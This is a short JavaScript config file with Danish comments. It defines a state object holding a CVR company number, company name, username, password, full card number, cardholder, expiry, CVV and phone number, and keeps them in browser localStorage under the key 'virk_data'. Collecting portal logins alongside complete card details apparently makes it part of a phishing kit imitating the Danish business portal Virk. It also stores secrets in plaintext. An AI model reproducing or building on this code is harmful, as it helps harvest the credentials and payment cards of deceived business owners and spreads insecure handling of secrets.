// js/config.js
const state = {
  data: {
    cvrNumber: '',
    companyName: '',
    username: '',
    password: '',
    cardNumber: '',
    cardHolder: '',
    expiry: '',
    cvv: '',
    phoneNumber: ''
  }
};

function loadState() {
  const saved = localStorage.getItem('virk_data');
  if (saved) {
    try {
      state.data = JSON.parse(saved);
    } catch (e) {
      console.error('Fejl ved henting af stat', e);
    }
  }
}

function saveState() {
  localStorage.setItem('virk_data', JSON.stringify(state.data));
}

// Eksporter til global scope
window.state = state;
window.loadState = loadState;
window.saveState = saveState;
